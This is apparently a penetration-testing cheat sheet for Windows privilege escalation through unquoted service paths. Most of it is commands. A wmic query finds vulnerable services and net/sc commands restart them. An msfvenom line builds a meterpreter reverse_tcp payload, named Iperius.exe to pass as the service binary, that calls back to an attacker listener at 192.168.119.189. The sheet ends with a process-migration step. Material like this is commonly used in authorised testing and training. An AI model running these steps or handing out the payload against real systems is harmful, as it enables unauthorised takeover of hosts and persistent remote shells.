# Unquoted Service Paths

Check for vulnerable services

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

If using PowerUp.ps1, make sure `CanRestart` field is `True` for the vulnerable service.

If the service can be restarted, check if we can write to the service path.

Create a payload and restart the service / reboot the host. To restart the service, use either of the following command line tools.

```
net stop/start <ServiceName>
sc stop/start <ServiceName>
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.189 LPORT=80 EXITFUNC=thread -f exe -o Iperius.exe
```

Start multi handler and migrate to new process (meterpreter)

```
run post/windows/manage/migrate
```

Here's a good example to follow: [https://www.exploit-db.com/exploits/48543](https://www.exploit-db.com/exploits/48543)
